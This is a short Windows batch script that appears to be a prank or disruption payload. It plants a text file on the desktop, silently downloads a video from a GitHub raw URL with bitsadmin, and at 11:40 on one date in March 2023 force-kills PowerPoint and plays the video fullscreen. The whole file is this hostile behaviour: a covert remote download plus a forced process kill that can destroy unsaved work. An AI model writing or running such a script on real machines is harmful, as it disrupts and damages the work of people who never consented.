@echo off

echo up > "%USERPROFILE%\Desktop\Yeni Metin Belgesi.txt"

if not exist "%TEMP%\ataturk.mp4" (
bitsadmin /transfer vidjob /download /priority high "https://raw.githubusercontent.com/similartobash/rc/main/video.mp4" "%TEMP%\ataturk.mp4"
)

if "%date%" == "Cmt 04.03.2023" (
:timeloop
if "%time:~0,5%" == "11:40" (
taskkill /f /im POWERPNT.EXE
rem set video2play="%TEMP%\ataturk.mp4"
rem set wmplayer="%ProgramFiles(x86)%\Windows Media Player\wmplayer.exe" /prefetch:1
rem %wmplayer% %video2play% /fullscreen
"%ProgramFiles(x86)%\Windows Media Player\wmplayer.exe" "%TEMP%\ataturk.mp4" /fullscreen
) else (
timeout /t 10
goto :timeloop
)
)

exit
